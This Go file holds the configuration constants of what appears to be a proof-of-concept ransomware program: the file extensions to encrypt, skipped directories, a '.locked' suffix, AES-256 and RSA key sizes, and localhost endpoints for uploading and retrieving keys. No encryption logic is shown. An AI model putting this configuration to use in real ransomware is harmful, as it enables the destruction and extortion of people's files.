package main

// Extensions to encrypt
var Extensions = [...]string{
	"txt",
	"doc",
	"docx",
	"xls",
	"xlsx",
	"ppt",
	"pptx",
	"odt",
	"jpg",
	"png",
	"csv",
	"sql",
	"mdb",
	"sln",
	"php",
	"asp",
	"aspx",
	"html",
	"xml",
	"psd",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	"AppData",
	".",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = ".locked"

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (higher = exponentially slower)
	Bits int = 1024

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	UploadEndpoint = "http://localhost:1312/upload"

	RetrieveEndpoint = "http://localhost:1312/retrieve"
)
